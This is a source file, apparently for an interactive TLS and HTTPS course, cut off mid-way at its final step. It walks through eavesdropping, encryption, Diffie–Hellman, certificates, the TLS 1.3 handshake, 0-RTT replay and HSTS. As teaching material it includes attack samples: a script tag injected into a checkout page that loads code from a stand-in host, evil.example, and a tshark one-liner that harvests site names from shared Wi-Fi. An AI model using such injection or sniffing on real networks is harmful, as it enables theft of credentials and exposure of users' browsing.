import type { ReactNode } from 'react';
import { ActionsCard, ToggleCard } from '@/components/lesson/cards';
import type { CodeSpec } from '@/components/lesson/CodeBlock';
import { Aside } from '@/components/lesson/Prose';
import type { QuizSpec } from '@/components/lesson/QuizCard';
import { Term } from '@/components/lesson/Term';
import type { LegendItem } from '@/components/stage/chrome';
import type { Callout } from '@/components/stage/overlays';
import { SIG } from '@/lib/sim/colors';
import { ChainCard, CheatSheet, PaintPicker, Playground } from './panel/cards';
import type { StageCfg, TlsSim } from './sim/TlsSim';

export const META = { slug: 'tls', code: 'NET-05', track: 'Networking', title: 'TLS & HTTPS' };

export type HudKey = 'packets' | 'leaked' | 'goals' | 'rtt';

export interface Step {
  id: string;
  title: string;
  body: ReactNode;
  cfg: StageCfg;
  /** Restart the scene when the step starts (default true) */
  reset?: boolean;
  predict?: { rounds: number; prompt: ReactNode };
  /** Interaction card, built with the live sim */
  card?: (sim: TlsSim) => ReactNode;
  extra?: ReactNode;
  quiz?: QuizSpec;
  code?: CodeSpec;
  callouts?: Callout[];
  /** Callouts for the phone layout (defaults to `callouts`) */
  calloutsPortrait?: Callout[];
  legend?: LegendItem[];
  focus?: string[];
  hud?: HudKey[];
}

export interface Chapter {
  id: string;
  title: string;
  steps: Step[];
}

/* ---------- legend entries ---------- */
const L = {
  req: { label: 'request', color: SIG.req },
  res: { label: 'response', color: SIG.res },
  sealed: { label: 'encrypted (sealed)', color: SIG.res, shape: 'env' },
  copy: { label: 'Eve’s copy', color: SIG.err, shape: 'small' },
  tampered: { label: 'tampered', color: SIG.err },
  key: { label: 'key', color: SIG.lime, shape: 'square' },
  pub: { label: 'public key', color: SIG.teal, shape: 'square' },
  forged: { label: 'forgery', color: SIG.err },
  clear: { label: 'in the clear', color: SIG.req, shape: 'line' },
  enc: { label: 'encrypted', color: SIG.res, shape: 'line' },
  early: { label: '0-RTT early data', color: SIG.heavy, shape: 'line' },
  tcp: { label: 'TCP', color: SIG.dim, shape: 'line' },
  keys: { label: 'keys ready', color: SIG.lime, shape: 'ring' },
  replay: { label: 'replay', color: SIG.err, shape: 'line' },
} satisfies Record<string, LegendItem>;

export const CHAPTERS: Chapter[] = [
  /* ================================================================ */
  {
    id: 'why',
    title: 'Why HTTPS',
    steps: [
      {
        id: 'postcard',
        title: 'Plain HTTP is a postcard',
        cfg: { scene: 'wire', wire: { attacker: 'eve', proto: 'http', story: 'login' } },
        body: (
          <>
            <p>
              <Term k="alice">Alice</Term> is at a café, logging in to <Term k="server">shop.example</Term> over plain <strong>HTTP</strong>. Her request
              doesn’t fly straight to the shop. It hops through the <Term k="wifi">café’s Wi-Fi</Term>, then her <Term k="isp">ISP</Term>, then more
              routers on the way.
            </p>
            <p>
              Every one of those hops can read every byte. So can <Term k="eve">Eve</Term> at the next table, who is copying packets off the open
              Wi-Fi. Her panel shows exactly what she gets: the email and password, the session cookie, even the card digits and address on the
              account page.
            </p>
            <p>
              Plain HTTP is a <strong>postcard</strong>. Anyone who handles it along the way can read it.
            </p>
          </>
        ),
        callouts: [{ target: 'eve', text: <>copies <b>every packet</b> off the Wi-Fi</>, dir: 'left' }],
        calloutsPortrait: [],
        code: {
          title: 'what Eve captured',
          lang: 'http',
          code: `POST /login HTTP/1.1
Host: shop.example
Content-Type: application/x-www-form-urlencoded

!email=alice%40example.com&password=hunter2`,
        },
        legend: [L.req, L.res, L.copy],
        hud: ['packets', 'leaked'],
      },
      {
        id: 'tampering',
        title: 'Anyone in the middle can change it',
        cfg: { scene: 'wire', wire: { attacker: 'mallory', proto: 'http', story: 'checkout' } },
        body: (
          <>
            <p>
              Reading is only half the problem. Meet <Term k="mallory">Mallory</Term>. She runs her own hotspot named <code>Free_Cafe_WiFi</code>, and
              Alice’s laptop joined it. Every packet now passes through Mallory’s hands, and she can <strong>change</strong> anything before passing
              it on.
            </p>
            <p>
              Your turn: let Mallory inject a script into the checkout page. As far as Alice’s browser can tell, the page came straight from
              shop.example. Nothing marks it as modified. The script pops up a fake “re-enter your card” box, and whatever Alice types goes to
              Mallory.
            </p>
            <Aside>
              This isn’t hypothetical. ISPs and hotel networks have injected ads and tracking headers into unencrypted pages, and anyone on the
              path can do the same.
            </Aside>
          </>
        ),
        card: (sim) => (
          <ActionsCard
            buttons={[
              {
                label: 'Let Mallory inject a <script>',
                icon: 'bolt',
                run: () => sim.wire.setTamper(true),
                after: (
                  <>
                    The next page Alice loads carries Mallory’s script. Over plain HTTP the browser has <strong>no way to notice</strong>.
                  </>
                ),
              },
              { label: 'Stop tampering', icon: 'replay', run: () => sim.wire.setTamper(false) },
            ]}
          />
        ),
        code: {
          title: 'the page Alice receives',
          lang: 'http',
          code: `HTTP/1.1 200 OK
Content-Type: text/html

<h1>Checkout</h1>
<p>1 × Trail boots · $49.00</p>
!<script src="//evil.example/x.js"></script>`,
          note: 'Mallory added the last line. Without HTTPS the browser cannot tell.',
        },
        legend: [L.req, L.res, L.tampered],
      },
      {
        id: 'three-goals',
        title: 'What HTTPS promises',
        cfg: { scene: 'wire', wire: { attacker: 'eve', proto: 'http', story: 'login' } },
        body: (
          <>
            <p>
              <strong>HTTPS</strong> is ordinary HTTP carried inside a <strong>TLS</strong> (Transport Layer Security) connection. It promises
              three things:
            </p>
            <p>
              <strong>Confidentiality</strong>: only Alice and the shop can read the traffic. <strong>Integrity</strong>: any change in transit is
              detected. <strong>Authentication</strong>: Alice is really talking to shop.example, not an impostor.
            </p>
            <p>
              Flip the switch and watch <Term k="eve">Eve’s view</Term>. She still sees <em>who</em> talks to whom and roughly how much, but the
              password, cookies and pages turn into noise. The rest of this lesson is about how TLS pulls that off between two strangers.
            </p>
          </>
        ),
        card: (sim) => (
          <ToggleCard
            prompt="Protect Alice’s traffic:"
            options={[
              { label: 'Plain HTTP', apply: () => sim.wire.setProto('http'), note: <>Port 80. Everything Eve copies is readable.</> },
              {
                label: 'HTTPS',
                apply: () => sim.wire.setProto('https'),
                note: (
                  <>
                    Port 443. Eve gets <strong>TLS records</strong>: addresses, sizes and ciphertext. The packets are now sealed envelopes.
                  </>
                ),
              },
            ]}
          />
        ),
        code: {
          title: 'a TLS record on the wire',
          lang: 'http',
          code: `!17 03 03 02 6c       # type 23, 620 bytes
8e 1f c4 9a 02 7d …   # ciphertext
… 90 3a 17 b2 44 e8   # ends in a 16-byte tag`,
          note: 'In TLS 1.3 every encrypted record claims to be “application data”; the real type is hidden inside.',
        },
        legend: [L.req, L.res, L.sealed, L.copy],
        hud: ['goals'],
      },
    ],
  },

  /* ================================================================ */
  {
    id: 'keys',
    title: 'Two kinds of keys',
    steps: [
      {
        id: 'one-shared-key',
        title: 'Symmetric encryption: one shared key',
        cfg: { scene: 'wire', wire: { attacker: 'mallory', proto: 'sym', story: 'orders' } },
        body: (
          <>
            <p>
              Suppose Alice and the shop already share a secret <strong>key</strong> (the lime <em>K</em>). Then encryption is easy.{' '}
              <strong>Symmetric encryption</strong> uses that one key both to lock and to unlock. <Term k="mallory">Mallory</Term> still handles every
              packet, but without K she sees only noise.
            </p>
            <p>
              TLS uses <strong>AEAD</strong> ciphers such as <strong>AES-GCM</strong> and <strong>ChaCha20-Poly1305</strong>. Besides encrypting,
              they attach a 16-byte <strong>authentication tag</strong>: a seal computed from the key and every byte of the record. They’re also
              fast, gigabytes per second on one CPU core.
            </p>
            <p>So Mallory can’t read the orders page. But can she change it? Break it: flip a single bit.</p>
          </>
        ),
        card: (sim) => (
          <ActionsCard
            buttons={[
              {
                label: 'Flip one bit in the next record',
                icon: 'bolt',
                run: () => sim.wire.flipBit(),
                after: (
                  <>
                    The tag no longer matches, so Alice’s browser rejects the record with a <code>bad_record_mac</code> alert and closes the
                    connection. Mallory can <strong>break</strong> the connection, but she can’t change what it says.
                  </>
                ),
              },
            ]}
          />
        ),
        code: {
          title: 'aes-gcm.js (Node.js)',
          lang: 'js',
          code: `import { randomBytes, createCipheriv }
  from 'node:crypto';

!const key = randomBytes(32); // the shared K
const iv = randomBytes(12);  // fresh per record
!const c = createCipheriv('aes-256-gcm', key, iv);
const ct = Buffer.concat([
  c.update('GET /orders'), c.final()]);
!const tag = c.getAuthTag(); // 16-byte seal`,
        },
        legend: [L.req, L.sealed, L.tampered],
      },
      {
        id: 'key-problem',
        title: 'The chicken-and-egg problem',
        cfg: { scene: 'wire', wire: { attacker: 'eve', proto: 'leak', story: 'keys' } },
        body: (
          <>
            <p>
              So where does the shared key come from? Alice and shop.example have never met, and everything they say crosses the same Wi-Fi that{' '}
              <Term k="eve">Eve</Term> is copying.
            </p>
            <p>
              Watch the obvious attempt. Alice makes a random key and sends it over. Eve copies the key along with everything else, so every
              “encrypted” message after it is an open book to her.
            </p>
            <p>
              That’s the <strong>chicken-and-egg problem</strong>: to send the key secretly they need encryption, and to encrypt they need a key.
              They need a way to <em>agree</em> on a key in public without ever sending it.
            </p>
          </>
        ),
        callouts: [{ target: 'eve', text: <>she has <b>the key</b> too</>, dir: 'left' }],
        calloutsPortrait: [],
        legend: [L.key, L.req, L.res, L.copy],
        hud: ['packets', 'leaked'],
      },
      {
        id: 'public-and-private',
        title: 'Public and private keys',
        cfg: { scene: 'wire', wire: { attacker: 'eve', proto: 'pair', story: 'pair' } },
        body: (
          <>
            <p>
              <strong>Asymmetric</strong> (public-key) cryptography gives each party a <strong>key pair</strong>. The{' '}
              <Term k="server">server’s</Term> <strong>private key</strong> never leaves it. Its <strong>public key</strong> can go to anyone,
              including Eve.
            </p>
            <p>
              What one half does, only the other half can check. The server <strong>signs</strong> a message with its private key, and anyone with
              the public key can verify it. Eve can read the signed message, but she can’t produce a valid signature, so her forgery is rejected.
            </p>
            <p>
              The catch is speed. Public-key math is far too slow to encrypt whole pages, so TLS uses it only during the handshake, for two jobs:{' '}
              <strong>agreeing on a shared key</strong> (next chapter) and <strong>proving identity</strong> with signatures. Everything after that
              is fast symmetric encryption.
            </p>
            <Aside>Ballpark, on one CPU core: AES-GCM encrypts gigabytes per second, while a single RSA-2048 signature takes around a millisecond.</Aside>
          </>
        ),
        code: {
          title: 'sign.js (Node.js)',
          lang: 'js',
          code: `import { generateKeyPairSync, sign, verify }
  from 'node:crypto';

!const { publicKey, privateKey } =
!  generateKeyPairSync('ed25519');
const msg = Buffer.from('I am shop.example');

// only the private key can make a signature
!const sig = sign(null, msg, privateKey);
// anyone with the public key can check it
!verify(null, msg, publicKey, sig); // true`,
        },
        legend: [L.pub, L.res, L.forged, L.copy],
      },
    ],
  },

  /* ================================================================ */
  {
    id: 'dh',
    title: 'A secret in public',
    steps: [
      {
        id: 'paint-mixing',
        title: 'Mixing paint in public',
        cfg: { scene: 'paint', paint: { mode: 'paint', a: 'crimson', b: 'blue' } },
        predict: { rounds: 2, prompt: 'Watch the paint. The animation stops when it’s your turn.' },
        body: (
          <>
            <p>
              Here’s the trick, with paint. Alice and the server agree on a <Term k="pa:common">common color</Term> in public. Eve sees it too, and
              that’s fine.
            </p>
            <p>
              Each side also picks a <strong>secret color</strong> and keeps it (the pots with padlocks). Each mixes its secret into the common
              paint and sends the <strong>mixture</strong> across the wire, where <Term k="pa:eve">Eve</Term> copies both.
            </p>
            <p>Then each side adds its own secret to the mixture it received. Two questions come up along the way. Predict them.</p>
            <Aside>
              The analogy works because mixing paint is easy and un-mixing it is practically impossible. Real key exchange uses math with the same
              one-way property.
            </Aside>
          </>
        ),
        callouts: [{ target: 'pa:aSec', text: <>a secret: <b>never leaves Alice</b></>, dir: 'up' }],
        calloutsPortrait: [],
      },
      {
        id: 'mix-your-own',
        title: 'Mix your own',
        cfg: { scene: 'paint', paint: { mode: 'paint', a: 'crimson', b: 'blue' } },
        body: (
          <>
            <p>Your turn. Pick a secret for each side below. The exchange replays from the moment the secrets are chosen.</p>
            <p>
              Whatever you pick, the two final pots match, because both hold exactly the same three paints. And Eve, who saw the common paint and
              both mixtures, still can’t produce it: her best attempt contains the common paint twice.
            </p>
            <p>
              Notice what never crossed the wire: the secrets, and the final color. The shared secret was <strong>computed</strong> on each side,
              never sent.
            </p>
          </>
        ),
        card: (sim) => <PaintPicker sim={sim} initial={{ a: 'crimson', b: 'blue' }} />,
      },
      {
        id: 'real-numbers',
        title: 'The real thing: numbers',
        cfg: { scene: 'paint', paint: { mode: 'numbers' } },
        body: (
          <>
            <p>
              Real key exchange swaps paint for numbers. This is <strong>Diffie–Hellman</strong> in miniature. The common paint is two public
              numbers, <code>g = 5</code> and <code>p = 23</code>. Alice’s secret is <code>a = 6</code>, the server’s is <code>b = 15</code>.
            </p>
            <p>
              Mixing means raising <code>g</code> to the secret, mod <code>p</code>. Alice sends <code>A = 5⁶ mod 23 = 8</code>, the server sends{' '}
              <code>B = 19</code>. Each raises what it received to its own secret: <code>19⁶ mod 23 = 2</code> and <code>8¹⁵ mod 23 = 2</code>. The
              same number, and it never crossed the wire.
            </p>
            <p>
              Eve would have to find <code>a</code> from <code>5ᵃ mod 23 = 8</code>, the <strong>discrete logarithm</strong>. Easy by trial with
              numbers this small, hopeless with the 255-bit numbers of <strong>X25519</strong>, the elliptic-curve version TLS 1.3 uses.
            </p>
            <p>
              Each side makes a fresh key pair for every connection and throws it away after (the last E in <strong>ECDHE</strong> is for
              ephemeral). That gives <strong>forward secrecy</strong>: steal the server’s keys next year, and today’s recorded traffic stays sealed.
            </p>
            <Aside>
              Browsers and OpenSSL now usually negotiate <code>X25519MLKEM768</code>: X25519 combined with a post-quantum algorithm, so that a
              future quantum computer can’t decrypt today’s recordings either.
            </Aside>
          </>
        ),
        code: {
          title: 'ecdh.js (Node.js)',
          lang: 'js',
          code: `import { generateKeyPairSync, diffieHellman }
  from 'node:crypto';

const alice = generateKeyPairSync('x25519');
const server = generateKeyPairSync('x25519');
// each side sends only its public key

!const s1 = diffieHellman({
!  privateKey: alice.privateKey,
!  publicKey: server.publicKey });
!const s2 = diffieHellman({
!  privateKey: server.privateKey,
!  publicKey: alice.publicKey });
s1.equals(s2); // true: the shared secret`,
        },
      },
      {
        id: 'man-in-the-middle',
        title: 'The blind spot: who is on the other end?',
        cfg: { scene: 'paint', paint: { mode: 'mitm' } },
        body: (
          <>
            <p>
              Diffie–Hellman beats someone who only listens. But what if the attacker sits <em>in</em> the path, like{' '}
              <Term k="pa:mal">Mallory</Term> with her hotspot?
            </p>
            <p>
              She doesn’t need to un-mix anything. She runs <strong>two</strong> exchanges: one with Alice, pretending to be the server, and one
              with the server, pretending to be Alice. Each side ends up with a perfectly good shared key… with Mallory. She decrypts what Alice
              sends, reads it, re-encrypts it for the server, and does the same on the way back.
            </p>
            <p>
              Key agreement alone can’t tell Alice <em>who</em> she agreed with. The server has to prove who it is. That’s the job of{' '}
              <strong>certificates</strong>.
            </p>
          </>
        ),
        quiz: {
          question: 'What would let Alice detect Mallory here?',
          options: [
            { text: 'Bigger secret numbers', why: 'Mallory never breaks the math. She just runs the exchange herself, twice.' },
            {
              text: 'Proof that the key share she received really came from shop.example',
              correct: true,
              why: 'Exactly. In TLS the server signs the handshake, including its key share, with a key that a certificate ties to shop.example.',
            },
            { text: 'Encrypting the mixtures before sending them', why: 'With what key? That’s the chicken-and-egg problem again.' },
          ],
        },
      },
    ],
  },

  /* ================================================================ */
  {
    id: 'certs',
    title: 'Certificates',
    steps: [
      {
        id: 'the-certificate',
        title: 'A certificate is a signed ID card',
        cfg: { scene: 'cert', cert: { mode: 'inspect' } },
        body: (
          <>
            <p>
              A <strong>certificate</strong> is a small signed document that says “this public key belongs to <code>shop.example</code>”. It is
              signed by a <strong>Certificate Authority</strong> (CA), an organization browsers trust to check who controls a domain, such as
              Let’s Encrypt or DigiCert.
            </p>
            <p>
              The server sends it during the handshake. Follow the highlight through the <Term k="ce:leaf">leaf certificate</Term>: who it’s for, who
              issued it, when it’s valid, the public key, and the CA’s signature over all of it.
            </p>
            <p>
              One more piece. Certificates are public, so anyone can copy one. That’s why the server also signs the handshake itself with the
              matching <strong>private key</strong>, in a message called <code>CertificateVerify</code>. The signature covers its Diffie–Hellman
              key share, which closes Mallory’s trick.
            </p>
          </>
        ),
        code: {
          title: 'openssl x509 -text (abridged)',
          lang: 'conf',
          code: `Certificate:
  Serial Number: 23:b0:0e:6c:d2:b9:4c:31:…
!  Issuer: C=US, O=Example Trust, CN=Example CA R3
  Validity
!    Not Before: Aug  1 00:00:00 2026 GMT
!    Not After : Oct 30 23:59:59 2026 GMT
  Subject: CN=shop.example
!  Public Key Algorithm: id-ecPublicKey (P-256)
  X509v3 Subject Alternative Name:
!    DNS:shop.example, DNS:www.shop.example
  Signature Algorithm: sha256WithRSAEncryption
  Signature Value: 54:ab:e0:2f:aa:02:3f:5f:…`,
        },
      },
      {
        id: 'chain-of-trust',
        title: 'The chain of trust',
        cfg: { scene: 'cert', cert: { mode: 'verify' } },
        body: (
          <>
            <p>
              Alice’s browser has never heard of <code>Example CA R3</code>. So the server sends a <strong>chain</strong>: its leaf certificate plus
              the <Term k="ce:inter">intermediate</Term> certificate that issued it. The intermediate was in turn signed by a root CA.
            </p>
            <p>
              The root doesn’t need to be sent. Roughly 150 roots come pre-installed in Alice’s operating system or browser, the{' '}
              <Term k="ce:store">trust store</Term>. Trust flows down from there, one signature at a time.
            </p>
            <p>Your turn: run the browser’s checks one by one and watch what each one looks at.</p>
            <Aside>
              Browsers also check that a certificate hasn’t been revoked, mostly from compact lists the browser downloads (Chrome’s CRLSets,
              Firefox’s CRLite) rather than by asking the CA on every visit. Short lifetimes help too: a 90-day certificate expires on its own.
            </Aside>
          </>
        ),
        card: (sim) => <ChainCard sim={sim} />,
        code: {
          title: 'openssl s_client (abridged)',
          lang: 'shell',
          code: `$ openssl s_client -connect shop.example:443 \\
    -servername shop.example
depth=2 C=US, O=Example Trust, CN=Example Root X1
verify return:1
depth=1 C=US, O=Example Trust, CN=Example CA R3
verify return:1
depth=0 CN=shop.example
verify return:1
CONNECTED(00000003)
---
!Certificate chain
! 0 s:CN=shop.example
!   i:C=US, O=Example Trust, CN=Example CA R3
! 1 s:C=US, O=Example Trust, CN=Example CA R3
!   i:C=US, O=Example Trust, CN=Example Root X1
---
Negotiated TLS1.3 group: X25519MLKEM768
Verification: OK
---
!New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
!Protocol: TLSv1.3
Verify return code: 0 (ok)`,
          note: 'Abridged output of OpenSSL 3.6. The root isn’t in “Certificate chain”: Alice already has it, so the server doesn’t send it.',
        },
      },
      {
        id: 'fake-certificates',
        title: 'Mallory’s fake certificates',
        cfg: { scene: 'cert', cert: { mode: 'fake' } },
        predict: { rounds: 3, prompt: 'Which check stops this certificate? Inspect it on the stage, then answer.' },
        body: (
          <>
            <p>
              Back to <Term k="ce:server">Mallory</Term>. She intercepts Alice’s connection, so she must hand over <em>some</em> certificate for
              shop.example. She tries five tricks.
            </p>
            <p>
              For each one, <strong>predict which check stops her</strong>. Read the certificate on the stage first. When a check fails, the browser
              aborts the handshake before a single byte of HTTP is sent, and shows a full-page warning.
            </p>
            <Aside>
              Real browsers check the whole chain at once and may name a different first error; the order here is for clarity. And the warning page
              is exactly where an attacker hopes you’ll click “proceed anyway”.
            </Aside>
          </>
        ),
        code: {
          title: 'the same checks in OpenSSL',
          lang: 'shell',
          code: `$ openssl s_client -connect shop.example:443 \\
    -servername shop.example \\
    -verify_hostname shop.example \\
    -verify_return_error
# Mallory's self-signed certificate:
!verify error:num=18:self-signed certificate
# a real certificate, for mallory.example:
!verify error:num=62:hostname mismatch
# an expired shop.example certificate:
!verify error:num=10:certificate has expired`,
        },
      },
    ],
  },

  /* ================================================================ */
  {
    id: 'handshake',
    title: 'The TLS 1.3 handshake',
    steps: [
      {
        id: 'client-hello',
        title: 'ClientHello: Alice speaks first',
        cfg: { scene: 'shake', shake: { proto: 'tls13', resume: 'full', tcp: false, upto: 1 } },
        body: (
          <>
            <p>
              Time to put the pieces together. Once the TCP connection is up, Alice’s browser opens with a <strong>ClientHello</strong>, and it’s
              already doing Diffie–Hellman.
            </p>
            <p>
              It lists the TLS versions and cipher suites it supports, and includes a <strong>key_share</strong>: Alice’s X25519 public value, her
              paint mixture. She guesses which key-exchange group the server will pick, so no extra round trip is needed.
            </p>
            <p>
              It also names the site in the <strong>SNI</strong> (Server Name Indication) extension, so a server hosting many sites knows which
              certificate to send. All of this travels in the clear. Check <Term k="hs:eve">Eve’s notebook</Term>.
            </p>
          </>
        ),
        code: {
          title: 'inside the ClientHello',
          lang: 'conf',
          code: `ClientHello
  version      0x0303   # “TLS 1.2”: old boxes
  random       32 random bytes
  ciphers      TLS_AES_128_GCM_SHA256, …
!  server_name  shop.example   # the SNI
  versions     TLS 1.3, TLS 1.2
!  key_share    x25519 · 3f 9a 1c … (32 B)
  alpn         h2, http/1.1`,
        },
        callouts: [{ target: 'hs:tap', text: <>in the clear: <b>Eve reads every field</b></>, dir: 'down' }],
        calloutsPortrait: [],
        legend: [L.clear],
      },
      {
        id: 'server-flight',
        title: 'The server answers, mostly encrypted',
        cfg: { scene: 'shake', shake: { proto: 'tls13', resume: 'full', tcp: false, predict: true } },
        predict: { rounds: 3, prompt: 'Before each message leaves the server: can Eve read it?' },
        body: (
          <>
            <p>
              The server picks a cipher suite and sends its own key share in a <strong>ServerHello</strong>. As soon as that exists, both sides can
              finish the Diffie–Hellman math and derive <strong>handshake keys</strong> (the lime key icons).
            </p>
            <p>
              The server doesn’t wait for a reply. In the same flight it sends its settings, its certificate, its CertificateVerify signature and a{' '}
              <strong>Finished</strong> message.
            </p>
            <p>
              Before each message leaves, <strong>predict</strong>: can Eve read it, or is it already encrypted?
            </p>
            <Aside>The brackets follow RFC 8446: {'{…}'} is encrypted with handshake keys, […] with application keys, no brackets means in the clear.</Aside>
          </>
        ),
        legend: [L.clear, L.enc, L.keys],
      },
      {
        id: 'one-round-trip',
        title: 'One round trip',
        cfg: { scene: 'shake', shake: { proto: 'tls13', resume: 'full', tcp: true } },
        body: (
          <>
            <p>
              Alice checks the certificate chain and the CertificateVerify signature, then sends her own <strong>Finished</strong>. Right behind it,
              in the same flight, goes the real request: <code>[GET /account]</code>, encrypted with application keys.
            </p>
            <p>
              So TLS 1.3 adds <strong>one round trip</strong> on top of TCP’s. <strong>TLS 1.2</strong> needed two: the client sent its key share
              only after hearing the server’s, then both sides confirmed with ChangeCipherSpec and Finished before any data could flow. Switch
              versions and compare the HUD.
            </p>
            <p>Look at Eve’s notebook for TLS 1.2, too. It sent the certificate in the clear.</p>
          </>
        ),
        card: (sim) => (
          <ToggleCard
            prompt="Protocol version:"
            options={[
              { label: 'TLS 1.3', apply: () => sim.shake.setProto('tls13'), note: <>Request leaves after 2 round trips (TCP + TLS).</> },
              { label: 'TLS 1.2', apply: () => sim.shake.setProto('tls12'), note: <>Request leaves after 3 round trips: a whole extra RTT, on every new connection.</> },
            ]}
          />
        ),
        code: {
          title: 'nginx.conf',
          lang: 'nginx',
          code: `server {
    listen 443 ssl;
    server_name shop.example;

    # leaf + intermediate, and the private key
!    ssl_certificate     /etc/ssl/fullchain.pem;
!    ssl_certificate_key /etc/ssl/privkey.pem;
!    ssl_protocols       TLSv1.2 TLSv1.3;
}`,
        },
        legend: [L.tcp, L.clear, L.enc, L.keys],
        hud: ['rtt'],
      },
      {
        id: 'resumption',
        title: 'Coming back: resumption and 0-RTT',
        cfg: { scene: 'shake', shake: { proto: 'tls13', resume: 'ticket', tcp: true, early: 'get' } },
        body: (
          <>
            <p>
              After a handshake the server hands Alice a <strong>session ticket</strong> (the <code>[NewSessionTicket]</code> you saw earlier). On
              her next visit she presents it, and both sides skip the certificate: that’s <strong>resumption</strong>.
            </p>
            <p>
              TLS 1.3 can go further. With <strong>0-RTT</strong> (early data), Alice sends her request right alongside the ClientHello, encrypted
              with a key derived from the ticket. The response arrives in the server’s very first flight.
            </p>
            <p>
              The catch: early data can be <strong>replayed</strong>. Mallory can record Alice’s first flight and send it again, and TLS by itself
              can’t tell the copy from the original. Break it below.
            </p>
            <Aside>
              That’s why servers accept only safe requests like GET as early data and answer anything else with <code>425 Too Early</code>. Early
              data also lacks forward secrecy: it is protected only by the ticket’s key.
            </Aside>
          </>
        ),
        card: (sim) => (
          <>
            <ToggleCard
              prompt="Alice comes back to the shop:"
              options={[
                { label: 'Resumed', apply: () => sim.shake.setResume('ticket'), note: <>No certificate this time, but still one round trip before the request.</> },
                {
                  label: '0-RTT: GET',
                  apply: () => {
                    sim.shake.setEarly('get');
                    sim.shake.setResume('0rtt');
                  },
                  note: <>The request rides along with the ClientHello. Zero round trips before the request leaves.</>,
                },
                {
                  label: '0-RTT: POST /buy',
                  apply: () => {
                    sim.shake.setEarly('post');
                    sim.shake.setResume('0rtt');
                  },
                  note: <>Imagine a server that accepted a purchase as early data…</>,
                },
              ]}
            />
            <ActionsCard
              kicker="Break it"
              buttons={[
                {
                  label: 'Mallory replays Alice’s first flight',
                  icon: 'replay',
                  run: () => sim.shake.replay(),
                  after: (
                    <>
                      With 0-RTT the server runs the early request <strong>again</strong>. Harmless for a GET, a second order for POST /buy. Without
                      early data, the replayed hello just starts a handshake Mallory can’t finish.
                    </>
                  ),
                },
              ]}
            />
          </>
        ),
        code: {
          title: 'nginx.conf',
          lang: 'nginx',
          code: `ssl_session_tickets on;   # resumption tickets
!ssl_early_data      on;   # accept 0-RTT data

location / {
    # "1" if the request came as early data;
    # the app answers 425 Too Early if unsafe
!    proxy_set_header Early-Data $ssl_early_data;
    proxy_pass http://app;
}`,
        },
        legend: [L.tcp, L.clear, L.enc, L.early, L.replay],
        hud: ['rtt'],
      },
    ],
  },

  /* ================================================================ */
  {
    id: 'limits',
    title: 'What’s still exposed',
    steps: [
      {
        id: 'what-eve-sees',
        title: 'What Eve can still see',
        cfg: { scene: 'wire', wire: { attacker: 'eve', proto: 'https', story: 'browse', ech: false } },
        body: (
          <>
            <p>
              With HTTPS, <Term k="eve">Eve’s</Term> notebook gets thin, but not empty. She still sees <strong>IP addresses and ports</strong> (every
              packet needs them), the <strong>size and timing</strong> of every record, and the <strong>site name</strong>: the SNI in the
              ClientHello travels in the clear. Unless Alice uses encrypted DNS, her DNS lookup gives the name away too.
            </p>
            <p>What she can’t see: the page path, query strings, headers, cookies, form fields, and every byte of every page.</p>
            <p>
              <strong>Encrypted Client Hello</strong> (ECH) closes the SNI gap. The real ClientHello is encrypted to a key the site publishes in
              DNS, inside an outer hello that names only a shared front server, such as a CDN. Toggle it and watch the site line.
            </p>
            <Aside>
              ECH only hides the name if many sites share the same front servers. If shop.example had its own IP address, the address alone would
              give it away.
            </Aside>
          </>
        ),
        card: (sim) => (
          <ToggleCard
            prompt="Encrypted Client Hello:"
            options={[
              { label: 'ECH off', apply: () => sim.wire.setEch(false), note: <>The SNI says shop.example, in plain text.</> },
              { label: 'ECH on', apply: () => sim.wire.setEch(true), note: <>Eve sees only the CDN’s public name. The real hello is sealed.</> },
            ]}
          />
        ),
        code: {
          title: 'Eve’s one-liner (Wireshark’s tshark)',
          lang: 'shell',
          code: `# which sites is everyone on this Wi-Fi using?
!$ tshark -i wlan0 -Y 'tls.handshake.type == 1' \\
    -T fields -e ip.dst \\
!    -e tls.handshake.extensions_server_name
203.0.113.10    shop.example
198.51.100.44   mail.example`,
        },
        legend: [L.req, L.res, L.sealed, L.copy],
      },
      {
        id: 'downgrade-hsts',
        title: 'Downgrade attacks and HSTS',
        cfg: { scene: 'wire', wire: { attacker: 'mallory', story: 'strip', hsts: false } },
        body: (
          <>
            <p>
              HTTPS only helps if the browser uses it. When Alice types <code>shop.example</code> without <code>https://</code>, the browser may try
              plain HTTP first, expecting a redirect. <Term k="mallory">Mallory</Term> catches that first request and never lets the upgrade
              happen: she speaks HTTPS to the shop herself and plain HTTP to Alice.
            </p>
            <p>
              This is <strong>SSL stripping</strong>. No certificate warning appears, because there is no TLS on Alice’s side at all, just a quiet
              “Not secure” in the address bar.
            </p>
            <p>
              The fix is <strong>HSTS</strong> (HTTP Strict Transport Security). After one <code>Strict-Transport-Security</code> header, the browser
              rewrites every <code>http://</code> to <code>https://</code> <em>before</em> sending anything, and won’t let the user click through
              certificate errors. Turn it on and replay the attack.
            </p>
            <Aside>
              The very first visit is still exposed, so sites can join the HSTS preload list built into browsers. Browsers also try HTTPS first on
              their own now, but fall back to HTTP if that fails, and an attacker can make it fail.
            </Aside>
          </>
        ),
        card: (sim) => (
          <ToggleCard
            prompt="shop.example’s HSTS policy:"
            options={[
              { label: 'No HSTS', apply: () => sim.wire.setHsts(false), note: <>Mallory keeps Alice on http:// and reads the password.</> },
              { label: 'HSTS', apply: () => sim.wire.setHsts(true), note: <>The browser goes straight to https://. Mallory can only relay ciphertext.</> },
            ]}
          />
        ),
        code: {
          title: 'nginx.conf',
          lang: 'nginx',
          code: `server {
  listen 80;
  # plain http only ever redirects
!  return 301 https://$host$request_uri;
}
server {
  listen 443 ssl;
  ssl_certificate     /etc/ssl/fullchain.pem;
  ssl_certificate_key /etc/ssl/privkey.pem;
!  add_header Strict-Transport-Security
!   "max-age=63072000; includeSubDomains; preload"
!   always;
}`,
          note: 'max-age=63072000 is two years. “preload” asks to be built into browsers.',
        },
        callouts: [{ target: 'alice', text: <>no padlock, <b>no warning</b></>, dir: 'down' }],
        calloutsPortrait: [],
        legend: [L.req, L.res, L.sealed],
      },
    ],
  },

  /* ================================================================ */
  {
    id: 'recap',
    title: 'Recap & playground',
    steps: [
      {
        id: 'cheat-sheet',
        title: 'Cheat sheet',
        cfg: { scene: 'shake', shake: { proto: 'tls13', resume: 'full', tcp: true } },
        body: <p>The whole TLS 1.3 handshake in one picture, and the pieces that make it work.</p>,
        extra: <CheatSheet />,
        legend: [L.tcp, L.clear, L.enc, L.keys],
        hud: ['rtt'],
      },
      {
        id: 'playground',
        title: 'Playground',
